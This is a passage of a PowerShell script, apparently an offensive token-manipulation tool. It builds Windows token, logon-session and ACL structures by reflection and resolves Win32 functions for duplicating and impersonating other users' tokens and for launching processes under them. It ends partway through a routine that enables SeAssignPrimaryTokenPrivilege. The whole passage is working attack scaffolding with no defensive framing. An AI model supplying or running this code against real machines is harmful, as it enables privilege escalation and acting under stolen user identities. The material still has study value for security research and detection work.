    $TypeBuilder.DefineLiteral('TokenImpersonationLevel', [UInt32] 9) | Out-Null
    $TypeBuilder.DefineLiteral('TokenStatistics', [UInt32] 10) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedSids', [UInt32] 11) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionId', [UInt32] 12) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroupsAndPrivileges', [UInt32] 13) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionReference', [UInt32] 14) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSandBoxInert', [UInt32] 15) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAuditPolicy', [UInt32] 16) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOrigin', [UInt32] 17) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevationType', [UInt32] 18) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLinkedToken', [UInt32] 19) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevation', [UInt32] 20) | Out-Null
    $TypeBuilder.DefineLiteral('TokenHasRestrictions', [UInt32] 21) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAccessInformation', [UInt32] 22) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationAllowed', [UInt32] 23) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationEnabled', [UInt32] 24) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIntegrityLevel', [UInt32] 25) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUIAccess', [UInt32] 26) | Out-Null
    $TypeBuilder.DefineLiteral('TokenMandatoryPolicy', [UInt32] 27) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLogonSid', [UInt32] 28) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsAppContainer', [UInt32] 29) | Out-Null
    $TypeBuilder.DefineLiteral('TokenCapabilities', [UInt32] 30) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerSid', [UInt32] 31) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerNumber', [UInt32] 32) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUserClaimAttributes', [UInt32] 33) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceClaimAttributes', [UInt32] 34) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedUserClaimAttributes', [UInt32] 35) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceClaimAttributes', [UInt32] 36) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceGroups', [UInt32] 37) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceGroups', [UInt32] 38) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
    $TypeBuilder.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
	$TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()

    #STRUCTs
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
	$LARGE_INTEGER = $TypeBuilder.CreateType()

    #Struct LUID
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
	$LUID = $TypeBuilder.CreateType()

    #Struct TOKEN_STATISTICS
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
	$TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('ExpirationTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('TokenType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicCharged', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicAvailable', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
	$TOKEN_STATISTICS = $TypeBuilder.CreateType()

    #Struct LSA_UNICODE_STRING
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
	$TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()

    #Struct LSA_LAST_INTER_LOGON_INFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
	$TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()

    #Struct SECURITY_LOGON_SESSION_DATA
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Username', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginDomain', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('AuthenticationPackage', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Session', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sid', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginServer', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('DnsDomainName', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('Upn', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('UserFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('LastLogonInfo', $LSA_LAST_INTER_LOGON_INFO, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonScript', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('ProfilePath', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectory', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectoryDrive', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogoffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('KickOffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordLastSet', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordCanChange', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()

    #Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    #Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()

    #Struct TOKEN_ELEVATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
	$TOKEN_ELEVATION = $TypeBuilder.CreateType()

    #Struct LUID_AND_ATTRIBUTES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		
    #Struct TOKEN_PRIVILEGES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()

    #Struct ACE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACE_HEADER', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AceType', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceFlags', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceSize', [UInt16], 'Public') | Out-Null
    $ACE_HEADER = $TypeBuilder.CreateType()

    #Struct ACL
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACL', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AclRevision', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz1', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AclSize', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceCount', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz2', [UInt16], 'Public') | Out-Null
    $ACL = $TypeBuilder.CreateType()

    #Struct ACE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACCESS_ALLOWED_ACE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('Header', $ACE_HEADER, 'Public') | Out-Null
    $TypeBuilder.DefineField('Mask', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('SidStart', [UInt32], 'Public') | Out-Null
    $ACCESS_ALLOWED_ACE = $TypeBuilder.CreateType()

    #Struct TRUSTEE
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TRUSTEE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('pMultipleTrustee', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('MultipleTrusteeOperation', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeForm', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ptstrName', [IntPtr], 'Public') | Out-Null
    $TRUSTEE = $TypeBuilder.CreateType()

    #Struct EXPLICIT_ACCESS
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('EXPLICIT_ACCESS', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('grfAccessPermissions', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfAccessMode', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfInheritance', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Trustee', $TRUSTEE, 'Public') | Out-Null
    $EXPLICIT_ACCESS = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
	$GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	$GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    

    $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
	$SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
	$SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
	$LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	$LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
	$LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	$LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)

    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)

    $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
    $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    $OpenWindowStationW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenWindowStationWAddr, $OpenWindowStationWDelegate)

    $OpenDesktopAAddr = Get-ProcAddress user32.dll OpenDesktopA
    $OpenDesktopADelegate = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)

    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)

    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)

    $GetSecurityInfoAddr = Get-ProcAddress advapi32.dll GetSecurityInfo
    $GetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    $GetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetSecurityInfoAddr, $GetSecurityInfoDelegate)

    $SetSecurityInfoAddr = Get-ProcAddress advapi32.dll SetSecurityInfo
    $SetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $SetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetSecurityInfoAddr, $SetSecurityInfoDelegate)

    $GetAceAddr = Get-ProcAddress advapi32.dll GetAce
    $GetAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $AddAccessAllowedAceAddr = Get-ProcAddress advapi32.dll AddAccessAllowedAce
    $AddAccessAllowedAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    $AddAccessAllowedAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddAccessAllowedAceAddr, $AddAccessAllowedAceDelegate)

    $CreateWellKnownSidAddr = Get-ProcAddress advapi32.dll CreateWellKnownSid
    $CreateWellKnownSidDelegate = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $CreateWellKnownSid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateWellKnownSidAddr, $CreateWellKnownSidDelegate)

    $SetEntriesInAclWAddr = Get-ProcAddress advapi32.dll SetEntriesInAclW
    $SetEntriesInAclWDelegate = Get-DelegateType @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $SetEntriesInAclW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetEntriesInAclWAddr, $SetEntriesInAclWDelegate)

    $LocalFreeAddr = Get-ProcAddress kernel32.dll LocalFree
    $LocalFreeDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)

    $LookupPrivilegeNameWAddr = Get-ProcAddress advapi32.dll LookupPrivilegeNameW
    $LookupPrivilegeNameWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $LookupPrivilegeNameW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeNameWAddr, $LookupPrivilegeNameWDelegate)
    ###############################


    #Used to add 64bit memory addresses
    Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


    #Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL
    function Enable-SeAssignPrimaryTokenPrivilege
    {	
	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw "Unable to get the handle to the current thread"
	    }
		
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, "SeAssignPrimaryTokenPrivilege", [Ref] $LuidObject)

	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

